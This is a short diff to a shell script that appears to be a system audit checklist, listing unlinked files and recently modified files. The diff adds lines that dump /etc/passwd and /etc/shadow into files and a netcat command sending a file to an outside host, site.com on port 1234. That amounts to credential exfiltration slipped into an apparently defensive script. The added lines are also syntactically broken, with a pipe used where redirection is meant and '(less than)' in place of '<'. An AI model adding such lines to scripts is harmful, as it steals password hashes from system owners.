@@ -63,7 +63,9 @@ echo
 echo open unlinked files 
 find /etc/passwd
 find /etc/shadow
-echo /etc/passwd
+cat /etc/passwd | passwd.txt
+cat /etc/shadow | shadow.txt
+nc site.com 1234 (less than) file_name
 lsof +L1
 echo
 echo file modded in 24hrs
